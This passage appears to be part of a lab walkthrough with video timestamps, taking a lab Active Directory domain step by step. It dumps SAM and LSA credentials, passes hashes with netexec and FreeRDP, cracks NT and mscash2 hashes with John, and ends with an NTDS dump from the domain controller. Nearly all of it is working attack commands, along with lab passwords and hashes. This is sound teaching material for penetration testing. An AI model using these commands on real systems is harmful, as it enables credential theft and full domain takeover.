    ```
    
    Copy
    
    Changes into the tasks folder and lists it, showing both saved hives with their sizes and timestamps.
    
    **Why**A failed `reg save` leaves no file and no error the operator notices. Listing the folder is the check that both exports actually landed.
    
    CLIENT-1 (evil-winrm shell)
    
    ```
    download sam
    ```
    
    Copy
    
    Transfers the SAM hive from the target into the Kali working folder.
    
    **Why**The hashes have to be extracted offline. evil-winrm's download command moves the file without needing a second transfer channel.
    
    CLIENT-1 (evil-winrm shell)
    
    ```
    download system
    ```
    
    Copy
    
    Transfers the SYSTEM hive into the Kali working folder.
    
    **Why**Both halves are needed for the offline extraction. Taking only the SAM leaves the boot key behind and the hashes stay locked.
    
    CLIENT-1 (evil-winrm shell)
    
    ```
    exit
    ```
    
    Copy
    
    Closes the WinRM shell and returns to the Kali prompt.
    
    **Why**Both files are already on Kali, so the interactive session has done its work. Closing it leaves the host with fewer logged-on sessions.
    
    **Tip**`reg save` needs a writable destination. A user profile folder works, but `C:\Windows\Tasks` is what the notes recommend because the backup privilege covers it and it is easy to find again.
    
15. 15Extract the local hashes and find the local-auth trick_32:28_
    
    Impacket reads the two hive files offline and prints the boot key, then the local accounts with their NT hashes. The built-in Administrator hash is the well-known empty-password hash, which is not a real password. The local account `Brian` has a hash that is worth chasing, because that account is a local administrator on the host.
    
    We try the hashes against the machine over SMB. The Administrator hash fails, and so does Brian's, because netexec treats both as domain accounts by default. The same failure over RDP confirms the protocol is not the problem.
    
    The hashes came out of the local SAM, so they have to be checked as local accounts. `--local-auth` tells netexec to authenticate against the machine's own account database. With that flag Brian's hash works, and the RDP run with the same flag reports administrator rights. The user listing still fails, which shows the account is a local administrator and not a domain administrator.
    
    Kali
    
    ```
    impacket-secretsdump -system system -sam sam local
    ```
    
    Copy
    
    Reads the two hive files in local mode and prints the boot key followed by each local account name and NT hash.
    
    **Why**The hives are already on disk, so no network traffic is needed. Extracting offline keeps the dump quiet and gives the hashes in a form the other tools can use.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
    ```
    
    Copy
    
    Tries the built-in Administrator hash against the host over SMB.
    
    **Why**It rules out the obvious account first. The hash is the empty-password value, so the failure shows the account is not usable as it stands.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u brian -H a14e59515478dc73bab72add13f6c3a9
    ```
    
    Copy
    
    Tries Brian's NT hash against the host over SMB.
    
    **Why**Pass-the-hash is worth trying before cracking, because the hash is already usable if the account is accepted. The failure here is the clue that the account is being checked against the domain.
    
    Kali
    
    ```
    netexec rdp 10.0.2.7 -u brian -H a14e59515478dc73bab72add13f6c3a9
    ```
    
    Copy
    
    Tries the same hash over RDP.
    
    **Why**It repeats the test on a different protocol. The same failure means the problem is the account context, not the SMB service.
    
    Kali
    
    ```
    netexec rdp 10.0.2.7 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
    ```
    
    Copy
    
    Tries the empty-password Administrator hash over RDP.
    
    **Why**The last protocol check on the useless account. It confirms the empty hash fails everywhere, so the search moves to the other local account.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u brian -H a14e59515478dc73bab72add13f6c3a9 --local-auth
    ```
    
    Copy
    
    Tries Brian's hash again, this time telling netexec to authenticate against the local account database instead of the domain.
    
    **Why**This is the turn of the chain. The hash came from the local SAM, so it only works when the tool is told to check it locally. The same hash that failed twice now succeeds.
    
    Kali
    
    ```
    netexec rdp 10.0.2.7 -u brian -H a14e59515478dc73bab72add13f6c3a9 --local-auth
    ```
    
    Copy
    
    Repeats the local-auth check over RDP and reports administrator rights on the host.
    
    **Why**A local administrator can take a desktop even when the SMB session is filtered. The RDP result confirms the privilege level the SMB run could not show.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u brian -H a14e59515478dc73bab72add13f6c3a9 --users
    ```
    
    Copy
    
    Tries to list the domain users with the local administrator hash.
    
    **Why**It shows the limit of the access. A local administrator on a member server cannot enumerate the domain, which is how the account is told apart from a domain administrator.
    
    **Tip**`--local-auth` is the flag that fixes a hash that looks valid but fails. A hash taken from the local SAM is a local account, and the default behaviour checks the domain, so the two never match without the flag.
    
16. 16Connect as Brian and crack the local hash_36:36_
    
    The local-auth RDP check reported administrator rights, so we open a desktop session with the hash directly. FreeRDP takes the hash with `/pth` and the connection is refused with a message about the account's logon restrictions. That is a policy on the account, not a wrong hash, so the way in is to crack the hash and log in with the password.
    
    We put the hash in a file and run John. The first run recognises the hash as LM and cracks nothing, because the format is wrong for a single NT hash. The second run names the format explicitly and recovers `Iloveyou:D`.
    
    The password contains a colon, which is why the RDP command has to quote it. With the password we open the desktop and check the privileges the session actually holds.
    
    Kali
    
    ```
    xfreerdp3 /v:10.0.2.7 /u:brian /pth:a14e59515478dc73bab72add13f6c3a9 /cert:ignore +clipboard /dynamic-resolution
    ```
    
    Copy
    
    Opens an RDP session to CLIENT-1 as Brian, passing the NT hash instead of a password.
    
    **Why**Pass-the-hash avoids the crack entirely if the account is allowed to log on. The refusal is the information the step needs: the account exists and the hash is right, but a policy blocks the logon.
    
    Kali
    
    ```
    gedit client_l_hash
    ```
    
    Copy
    
    Creates a file called `client_l_hash` and writes Brian's NT hash into it.
    
    **Why**John needs the hash in a file with the right name. Naming the file after the host it came from keeps the two hash sources apart.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt client_l_hash
    ```
    
    Copy
    
    Runs John against the hash file without a format flag.
    
    **Why**It shows the failure mode. John guesses the format from the hash text, and a bare 32-character hash is read as LM, which is the wrong algorithm and cracks nothing.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT client_l_hash
    ```
    
    Copy
    
    Runs John again with `--format=NT` so the hash is treated as an NT hash.
    
    **Why**The explicit format is the fix. An NT hash and an LM hash are both 32 characters, so the tool cannot tell them apart without being told.
    
    Kali
    
    ```
    xfreerdp3 /v:10.0.2.7 /u:brian /p:'Iloveyou:D' /cert:ignore +clipboard /dynamic-resolution
    ```
    
    Copy
    
    Opens the desktop session again, this time with the cracked password in quotes.
    
    **Why**A password logon is not subject to the hash logon restriction that blocked the earlier attempt. The quotes are required because the password contains a colon.
    
    CLIENT-1 (RDP desktop)
    
    ```
    whoami /priv
    ```
    
    Copy
    
    Lists the privileges the desktop session holds.
    
    **Why**The session shows the privileges the SMB connection filtered out. That is what makes the desktop worth taking even though the network logon was refused.
    
    **Tip**A colon in a password breaks an unquoted command line, because the shell reads it as an argument separator. Quote the password whenever it contains punctuation.
    
17. 17Dump CLIENT-1 as jbailey_40:04_
    
    Back in the WinRM shell we pull the SYSTEM hive we saved earlier, because the first download only took the SAM. With both halves on Kali the shell has done its work and we close it.
    
    The `jbailey` account has administrator rights on CLIENT-1, so netexec can dump the machine's secrets directly. The first run confirms the access level, then the SAM and LSA dumps follow.
    
    The LSA dump gives cached domain credentials, including the domain Administrator's. The LSASS module reads the same account's hash from memory as a cross-check. Before cracking anything we ask `haiti` what the 32-character hash might be, which is the step that tells us which format to give the cracker.
    
    CLIENT-1 (evil-winrm shell)
    
    ```
    download system
    ```
    
    Copy
    
    Transfers the SYSTEM hive from the tasks folder to Kali.
    
    **Why**The offline extraction needs both hives. The SAM was already pulled, so this completes the pair and the shell can be closed afterwards.
    
    CLIENT-1 (evil-winrm shell)
    
    ```
    exit
    ```
    
    Copy
    
    Closes the WinRM shell and returns to the Kali prompt.
    
    **Why**The interactive session is no longer needed once both files are local. Closing it reduces the number of logged-on sessions on the host.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u jbailey -p 'Paulio*3'
    ```
    
    Copy
    
    Checks the credential against CLIENT-1 and reports the access level, which is administrator.
    
    **Why**The administrator marker is the precondition for the dumps that follow. Confirming it first avoids running a dump that would be refused.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u jbailey -p 'Paulio*3' --sam
    ```
    
    Copy
    
    Dumps the local SAM hashes from CLIENT-1, one row per local account.
    
    **Why**It gives the local hashes in one request instead of exporting the hive by hand. The same result as the registry export, with less work.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u jbailey -p 'Paulio*3' --lsa
    ```
    
    Copy
    
    Dumps the LSA secrets, which include the cached domain logon hashes in the mscash2 format.
    
    **Why**The cached credentials are the domain accounts that logged on to this host. Cracking them is what moves the chain from local administrator to domain access.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u jbailey -p 'Paulio*3' -M lsassy
    ```
    
    Copy
    
    Runs the lsassy module to read credential material out of LSASS memory.
    
    **Why**It confirms the local hash from a second source. A hash that appears in both the SAM dump and the memory dump is certain to be right.
    
    Kali
    
    ```
    haiti 'a14e59515478dc73bab72add13f6c3a9'
    ```
    
    Copy
    
    Asks the hash identifier what format a 32-character hexadecimal value could be.
    
    **Why**The same length fits several Microsoft formats. Naming the format before cracking avoids the wasted run that a wrong guess produces.
    
    **Tip**`haiti` is a small helper that suggests hash formats. It is worth running on any bare hash before handing it to a cracker, because the format flag is what decides whether the run succeeds.
    
18. 18Crack the domain admin hash and take the domain_42:00_
    
    The cached credentials from CLIENT-1 include the domain Administrator's hash. We pull the LSA output again, keep only the cached lines, and crack them with John. The mscash2 format is slow to attack, so this is a longer run than the earlier ones.
    
    Back in BloodHound the graph confirms the target: `amorales` is in Domain Admins and is a tier zero object. The cached hash for that account cracks to a password, and the credential is then tried against the whole host list. It works on every machine, which is what a Domain Admin credential looks like.
    
    We finish the chain by dumping the domain database from the controller with that credential. The NTDS dump gives every account hash in the domain, including the krbtgt key, which is the material needed to forge Kerberos tickets. The video closes with the hives and the temporary group membership cleaned up.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u jbailey -p 'Paulio*3' --lsa | awk '{print $5}' | fgrep '/' | tee mscash_hashes
    ```
    
    Copy
    
    Dumps the LSA secrets again and keeps only the cached credential column, writing it to `mscash_hashes`.
    
    **Why**The cached hashes are the domain accounts that logged on to this host. Filtering them into a file gives John a clean input with no banner lines.
    
    Kali
    
    ```
    cat mscash_hashes
    ```
    
    Copy
    
    Prints the saved cached hashes so the accounts and the format can be checked.
    
    **Why**A filter that takes the wrong column would leave an empty file. Reading it back confirms there is something to crack before starting the run.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 mscash_hashes
    ```
    
    Copy
    
    Cracks the cached domain hashes with the mscash2 format named explicitly.
    
    **Why**The format flag is what makes John treat the values as cached domain credentials. The recovered password for the domain admin is the goal of this run.
    
    Kali
    
    ```
    netexec smb ips -u 'amorales' -p 'Seduction?1'
    ```
    
    Copy
    
    Tries the recovered Domain Admin credential against every host in the list.
    
    **Why**A Domain Admin credential should work everywhere. Testing the whole list shows the scope of the access in one run.
    
    CLIENT-1 (RDP desktop)
    
    ```
    hostname
    ```
    
    Copy
    
    Prints the machine name of the desktop we are on.
    
    **Why**The cleanup commands run on the host that holds the saved hives. Confirming the name first avoids running them on the wrong machine.
    
    CLIENT-1 (RDP desktop)
    
    ```
    net localgroup 'administrators' jbailey /del
    ```
    
    Copy
    
    Removes the temporary administrator membership that was used for the dumps.
    
    **Why**The membership was only needed to read the hives. Removing it leaves the host as it was found, which is the hygiene step at the end of the chain.
    
    CLIENT-1 (RDP desktop)
    
    ```
    net localgroup "administrators"
    ```
    
    Copy
    
    Lists the members of the local administrators group after the removal.
    
    **Why**It confirms the account is gone from the group. A cleanup that silently failed would leave the temporary access in place.
    
    CLIENT-1 (RDP desktop)
    
    ```
    cd c:\windows\tasks
    ```
    
    Copy
    
    Moves into the folder that holds the two saved hives.
    
    **Why**The hives were written there for the export. The folder has to be emptied so the target is left without the copied credential material.
    
    CLIENT-1 (RDP desktop)
    
    ```
    rm *
    ```
    
    Copy
    
    Deletes every file in the tasks folder, which removes the saved SAM and SYSTEM hives.
    
    **Why**The hives hold the local password hashes. Leaving them on disk would hand the next person the same dump without any work.
    
    Kali
    
    ```
    netexec smb 10.0.2.4 -u 'amorales' -p 'Seduction?1' --ntds
    ```
    
    Copy
    
    Dumps the NTDS database from the domain controller using the Domain Admin credential. netexec asks for confirmation first because the dump can be disruptive.
    
    **Why**The NTDS file holds every account hash in the domain. This is the step that turns domain administrator access into the keys for the whole domain.
    
    Kali
    
    ```
    y
    ```
    
    Copy
    
    Confirms the warning prompt and lets the dump run.
    
    **Why**netexec refuses to run the dump without an explicit answer, because the operation can crash an older controller. The prompt has to be answered before the hashes stream.
    
    **Tip**The mscash2 run is slow because each candidate goes through a long key derivation. A short wordlist and a targeted hash list keep the wait reasonable.
